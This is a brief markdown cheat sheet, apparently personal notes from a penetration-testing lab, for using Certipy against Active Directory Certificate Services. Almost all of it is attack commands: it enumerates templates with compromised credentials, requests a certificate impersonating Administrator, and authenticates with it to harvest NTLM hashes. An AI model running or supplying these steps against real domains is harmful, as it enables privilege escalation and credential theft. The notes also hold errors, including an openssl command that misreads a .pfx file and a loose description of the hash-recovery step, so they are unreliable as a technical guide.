# Certipy

#### Installation

Kali
```bash
sudo apt install certipy-ad
```

PKInit exploit
```bash
# Enumerate AD CS
certipy-ad find -u 'compromised.user' -p 'passwords' -dc-ip 10.200.116.102
# Custom Templates
# Enrollment Rights

# Request Certifacts
certipy-ad req -u '$@corp.thereserve.loc' -hashes 'ntlm:ntlm' -ca 'CERTIFICATEAUTHORITY-CA' -target '$DC.$childDomain.$domain.$tld' -template '$TemplateName' -upn 'Administrator@$childDomain.$domain.$tld' -dns '$DC.$childDomain.$domain.$tld' -dc-ip $dcIP -ns $nameServerIP
# First time will always timeout - do not worry
# Read with openssl 
openssl x509 -in $ceritificateName.pfx -text -noout
# Authenticate using a certificate
certipy-ad auth -dc-ip $dcIP -ns $nameServerIP -pfx $ceritificateName.pfx
# Because of PKInit you will receive the NTLM hashes from doing a S4U attack
# Enjoy
```

SChannel is a created LDAP session with a certificate.



